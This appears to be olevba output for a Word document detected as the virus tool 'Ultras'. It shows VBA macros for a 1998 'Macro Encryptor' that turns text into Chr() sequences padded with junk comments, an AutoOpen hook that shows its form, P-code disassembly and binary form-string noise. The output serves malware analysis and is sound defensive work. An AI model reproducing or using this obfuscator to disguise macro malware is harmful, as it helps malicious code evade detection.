olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Ultras.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Ultras.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UABOUT.frm 
in file: VirTool.MSWord.Ultras.b - OLE stream: 'Macros/VBA/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton5_Click()
UABOUT.Hide
UMAIN.Show
End Sub

Private Sub CommandButton6_Click()
MsgBox "www.coderz.net/ultras"
End
Documents.Close
End Sub
-------------------------------------------------------------------------------
VBA MACRO ULTRAS.bas 
in file: VirTool.MSWord.Ultras.b - OLE stream: 'Macros/VBA/ULTRAS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
USTART.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO UMAIN.frm 
in file: VirTool.MSWord.Ultras.b - OLE stream: 'Macros/VBA/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
End
Documents.Close
End Sub

Private Sub CommandButton2_Click()
UMAIN.Hide
UABOUT.Show
End Sub

Private Sub CommandButton3_Click()
On Error Resume Next
'hdfghdfhghdfgiuryuighfhdfghjgdfjihe
Dim this, that, Fcon As String
'y6456frdhjfghjdghjfghgfhgdhghfghdf
Set Con = New DataObject
'MaCro ENcRyPtoR bY ULTRAS (c)1998
If Text = "" Then
'fhgjydfihyghhdfghgfherghfghihdggc
MsgBox "You nor what and did not insert", vbCritical, "Misentry"
'jfrghdhgfhegfhygeryhrghjfghdjgfhgteyu
End
'fgthjrythjighhjdfhgrthguiruiygghhrh
End If
'krugytryitjgirugihrgirtyuigtyghrthiu
lent = Len(Text)
'fhgjiyfrigyrjigjirjitgjirghjigjigth
For countout = 1 To lent
'rthgirefghjfrhjighhrthjighghfgthhgrt
ToConvert = Mid(Text, countout, 1)
'zdgdfhgfyguy9999uryughrjkghrtyguruty
For u = 1 To 400
'jrgyuryuhd554khvhjgdhgvhdfghgvdfhhfvgh
that = Chr(u)
'hdfjgdhgdhjfg586jgdhfgvhdfhjgdfhjsdhj
If that = ToConvert Then
'dhfgkjhdjfhvidg85bxbjvcfcvhdghfryeue
Fcon = Fcon + "Chr(" & u & ")"
'ysdhfigdshgfhjs5467hjfgshjghjcgbshfuieutuwq
If countout <> lent Then Fcon = Fcon + " + "
'jdfghjdvuvcxbh12334yruifuyfrusdgfh
GoTo drop
'65347erthghdfgh333fhgfehrhdghgfrugeruyegr
End If
'zcxhsd45456yfudsjdfjidhgdhfghruiguiighrhtui
Next u
'rtegfgdgfhjgehrgfhgehfghueyureyufr44565674
drop:
'fgiehfygyuiergyuiyie456eyryifghdfhfghjdfghhj
Next countout
'fhgihrdfuiyguirfigdhhuigreyuieyurtyue3476rhdf
MsgBox "You Encrypt text copy in """ & UMAIN.txtVirus & """ file", vbExclamation, "Macro Encryptor by ULTRAS"
'khdfgjdfhgyhdfhghdr4568rghjdfghgffjhgfdgfg
live = "" & UMAIN.txtVirus & "" & ".txt"
Open live For Output As #1
Print #1, ""
Print #1, "' MACRO ENCRYPTOR by ULTRAS"
Print #1, "'       Version 1.0c"
Print #1, ""
Print #1, "' You text:"
Print #1, "' ~~~~~~~~~"
Print #1, "" & UMAIN.Text
Print #1, ""
Print #1, "' Encrypt text:"
Print #1, "' ~~~~~~~~~~~~~"
Print #1, "" & Fcon
Close #1
End Sub

-------------------------------------------------------------------------------
VBA MACRO USTART.frm 
in file: VirTool.MSWord.Ultras.b - OLE stream: 'Macros/VBA/USTART'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
USTART.Hide
UMAIN.Show
End Sub

Private Sub Image1_Click()
MsgBox "www.coderz.net/ultras"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.Ultras.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 919 bytes
' Macros/VBA/UABOUT - 2139 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #2:
' 	Ld UABOUT 
' 	ArgsMemCall Hide 0x0000 
' Line #3:
' 	Ld UMAIN 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #7:
' 	LitStr 0x0015 "www.coderz.net/ultras"
' 	ArgsCall MsgBox 0x0001 
' Line #8:
' 	End 
' Line #9:
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' Line #10:
' 	EndSub 
' Macros/VBA/ULTRAS - 1402 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld USTART 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	EndSub 
' Macros/VBA/UMAIN - 6975 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	End 
' Line #2:
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #6:
' 	Ld UMAIN 
' 	ArgsMemCall Hide 0x0000 
' Line #7:
' 	Ld UABOUT 
' 	ArgsMemCall Show 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	QuoteRem 0x0000 0x0023 "hdfghdfhghdfgiuryuighfhdfghjgdfjihe"
' Line #13:
' 	Dim 
' 	VarDefn this
' 	VarDefn that
' 	VarDefn Fcon (As String)
' Line #14:
' 	QuoteRem 0x0000 0x0022 "y6456frdhjfghjdghjfghgfhgdhghfghdf"
' Line #15:
' 	SetStmt 
' 	New id_1453
' 	Set Con 
' Line #16:
' 	QuoteRem 0x0000 0x0021 "MaCro ENcRyPtoR bY ULTRAS (c)1998"
' Line #17:
' 	Ld Then 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #18:
' 	QuoteRem 0x0000 0x0021 "fhgjydfihyghhdfghgfherghfghihdggc"
' Line #19:
' 	LitStr 0x001F "You nor what and did not insert"
' 	Ld vbCritical 
' 	LitStr 0x0008 "Misentry"
' 	ArgsCall MsgBox 0x0003 
' Line #20:
' 	QuoteRem 0x0000 0x0025 "jfrghdhgfhegfhygeryhrghjfghdjgfhgteyu"
' Line #21:
' 	End 
' Line #22:
' 	QuoteRem 0x0000 0x0023 "fgthjrythjighhjdfhgrthguiruiygghhrh"
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	QuoteRem 0x0000 0x0024 "krugytryitjgirugihrgirtyuigtyghrthiu"
' Line #25:
' 	Ld Then 
' 	FnLen 
' 	St lent 
' Line #26:
' 	QuoteRem 0x0000 0x0023 "fhgjiyfrigyrjigjirjitgjirghjigjigth"
' Line #27:
' 	StartForVariable 
' 	Ld countout 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld lent 
' 	For 
' Line #28:
' 	QuoteRem 0x0000 0x0024 "rthgirefghjfrhjighhrthjighghfgthhgrt"
' Line #29:
' 	Ld Then 
' 	Ld countout 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ToConvert 
' Line #30:
' 	QuoteRem 0x0000 0x0024 "zdgdfhgfyguy9999uryughrjkghrtyguruty"
' Line #31:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0190 
' 	For 
' Line #32:
' 	QuoteRem 0x0000 0x0026 "jrgyuryuhd554khvhjgdhgvhdfghgvdfhhfvgh"
' Line #33:
' 	Ld u 
' 	ArgsLd Chr 0x0001 
' 	St that 
' Line #34:
' 	QuoteRem 0x0000 0x0025 "hdfjgdhgdhjfg586jgdhfgvhdfhjgdfhjsdhj"
' Line #35:
' 	Ld that 
' 	Ld ToConvert 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	QuoteRem 0x0000 0x0024 "dhfgkjhdjfhvidg85bxbjvcfcvhdghfryeue"
' Line #37:
' 	Ld Fcon 
' 	LitStr 0x0004 "Chr("
' 	Add 
' 	Ld u 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St Fcon 
' Line #38:
' 	QuoteRem 0x0000 0x002B "ysdhfigdshgfhjs5467hjfgshjghjcgbshfuieutuwq"
' Line #39:
' 	Ld countout 
' 	Ld lent 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Fcon 
' 	LitStr 0x0003 " + "
' 	Add 
' 	St Fcon 
' 	EndIf 
' Line #40:
' 	QuoteRem 0x0000 0x0022 "jdfghjdvuvcxbh12334yruifuyfrusdgfh"
' Line #41:
' 	GoTo drop 
' Line #42:
' 	QuoteRem 0x0000 0x0029 "65347erthghdfgh333fhgfehrhdghgfrugeruyegr"
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	QuoteRem 0x0000 0x002B "zcxhsd45456yfudsjdfjidhgdhfghruiguiighrhtui"
' Line #45:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	QuoteRem 0x0000 0x002A "rtegfgdgfhjgehrgfhgehfghueyureyufr44565674"
' Line #47:
' 	Label drop 
' Line #48:
' 	QuoteRem 0x0000 0x002C "fgiehfygyuiergyuiyie456eyryifghdfhfghjdfghhj"
' Line #49:
' 	StartForVariable 
' 	Ld countout 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	QuoteRem 0x0000 0x002D "fhgihrdfuiyguirfigdhhuigreyuieyurtyue3476rhdf"
' Line #51:
' 	LitStr 0x001A "You Encrypt text copy in ""
' 	Ld UMAIN 
' 	MemLd txtVirus 
' 	Concat 
' 	LitStr 0x0006 "" file"
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x0019 "Macro Encryptor by ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	QuoteRem 0x0000 0x002A "khdfgjdfhgyhdfhghdr4568rghjdfghgffjhgfdgfg"
' Line #53:
' 	LitStr 0x0000 ""
' 	Ld UMAIN 
' 	MemLd txtVirus 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitStr 0x0004 ".txt"
' 	Concat 
' 	St live 
' Line #54:
' 	Ld live 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "' MACRO ENCRYPTOR by ULTRAS"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "'       Version 1.0c"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "' You text:"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "' ~~~~~~~~~"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	Ld UMAIN 
' 	MemLd Then 
' 	Concat 
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "' Encrypt text:"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "' ~~~~~~~~~~~~~"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	Ld Fcon 
' 	Concat 
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #67:
' 	EndSub 
' Line #68:
' Macros/VBA/USTART - 3161 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld USTART 
' 	ArgsMemCall Hide 0x0000 
' Line #2:
' 	Ld UMAIN 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Image1_Click())
' Line #6:
' 	LitStr 0x0015 "www.coderz.net/ultras"
' 	ArgsCall MsgBox 0x0001 
' Line #7:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������������������������������������������������������������������������������������������������������������������������������������������Կ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������￿�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������RRUBBF??B;;>DDF������������&&(""$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ć��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ���@@_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�������������������������eejfflqqwoo~tt�������������������MO�IL�EH�������������48�15�.2�+/�������#(�!&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ����SW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�������������*.�.2�36�jl����������z}�UW�\]�cd�������eekSSW@@C--/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������EEHAAD==@99=669225..1���������  "
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.���@@j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m  ����PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������MMQXX]cciootpp|ll�hh����������������OQ�KM�GJ�������������59�26�/3�-1�������%*�#(�!&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����UY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�������������-1�15�69�ln����������}~�XZ�_`�ff�������^^cKKO88;%%'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������DDG@@C<<?DDG���003,,/))+NNP������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���@@t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��ڏ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k00ypp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#���������������@@CKKNVVZkkp���qr{mm�ii����������������PR�LO�HK�������������7;�48�15�.2�������'+�%)�#(�!&� %�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$����WZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$� %�"&�������������04�48�9<�nq�������������[]�bc�ii�������VVZCCG003
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2���00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������??B;;>779ffh���++-'')##%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
777����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���@@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b���  ~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k����@@j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������==AHHLSSW������qqynojk�fg�������������RT�NP�JL�������������9<�69�37�04�������)-�'+�%)�LP����������Y\�"'�#(�%)�������������37�8;�<?�qs�������������_`�ef�ll�������MMQ;;>((*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ǿ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������::=558114bbd���%%'!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAB����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ѿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j����@@k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������<<?FFJQQU������qqwop~kl�gh�������������SU�OQ�LN�������������;>�8;�58�26�������+/�)-�'+�\_����������[_�%)�&*�(,�������������7:�;>�@C�tu�������������bc�ii�pp}������EEH224
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������557003,,.^^_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@D����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7����������
-------------------------------------------------------------------------------
